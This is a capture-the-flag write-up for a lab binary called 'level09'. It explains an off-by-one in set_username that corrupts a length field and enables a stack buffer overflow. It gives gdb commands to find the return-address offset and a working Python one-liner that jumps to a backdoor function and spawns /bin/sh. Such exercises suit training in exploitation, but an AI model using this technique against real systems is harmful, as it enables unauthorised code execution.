# Level 09

This is very similar to level 2 funny enough. If you look at the code, the loop in `set_username` runs `i <= 40` (41 iterations) into a 40-byte field, meaning the 41st byte overflows into `msg_len`, which controls how many bytes `set_msg` will copy. We can use this to overflow the message buffer and overwrite the return address.

We take the pattern from this website [Pattern Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) and do the following:

```
(python -c "print 'A' * 40 + '\xff' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'") > /tmp/output
gdb level09
(gdb) r < /tmp/output
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA^>: Msg @Unix-Dude
>>: >: Msg sent!
Program received signal SIGSEGV, Segmentation fault.
0x000000000000000a in ?? ()
(gdb) info registers rbp
rbp            0x6741356741346741 0x6741356741346741
```

We paste the rbp value into the website and get `192`. Since the return address is always stored 8 bytes above the saved rbp on the stack (because each slot is 8 bytes wide on 64-bit), the offset to the return address is `192 + 8 = 200`.

Before we proceed with the exploit, we need to know where to jump to. In the disassembled code there is a `secret_backdoor` function which reads a string with `fgets` and passes it directly to `system()`. We find its address with:

```
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

Since x86-64 stores addresses in little-endian byte order (least significant byte first), `0x55555555488c` becomes `\x8c\x48\x55\x55\x55\x55\x00\x00` when written into memory.

After jumping to `secret_backdoor`, it will call `fgets` waiting for more input — so we append `/bin/sh` as the next line of stdin, which then gets passed to `system()`, giving us a shell.

```
(python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '/bin/sh'"; cat) | ./level09
```
